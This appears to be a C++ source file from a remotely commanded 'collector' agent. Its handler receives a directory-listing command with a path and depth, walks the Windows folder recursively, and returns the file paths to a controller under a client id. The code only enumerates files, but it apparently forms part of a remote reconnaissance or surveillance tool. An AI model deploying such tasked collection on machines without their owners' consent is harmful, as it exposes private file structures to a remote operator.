#include "DirListHandler.h"

#include "Commands/DirListCommand.h"
#include "Products/DirListProduct.h"
#include "Protocol/ReturnProductRequest.h"
#include "Windows/WinUtils.h"

xp_collector::DirListHandler::DirListHandler(std::string client_id)
	: ICommandHandler(std::move(client_id))
{
}

std::unique_ptr<xp_collector::IRequest> xp_collector::DirListHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	const auto dir_list_command = std::static_pointer_cast<DirListCommand>(command);
	auto paths = windows::recurse_dir(dir_list_command->get_path(),
	                                  dir_list_command->get_depth());
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<DirListProduct>(command->get_command_id(), CommandType::DirList, std::move(paths))
	);
}
